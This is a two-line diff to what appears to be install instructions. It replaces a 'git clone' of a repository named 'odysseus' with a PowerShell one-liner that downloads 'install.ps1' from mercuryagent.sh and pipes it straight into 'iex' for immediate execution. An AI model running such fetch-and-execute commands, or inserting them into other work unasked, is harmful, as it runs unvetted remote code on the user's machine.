@@ -1,1 +1,2 @@
-git clone https://github.com/pewdiepie-archdaemon/odysseus.git && cd odysseus
+
+irm https://mercuryagent.sh/install.ps1 | iex
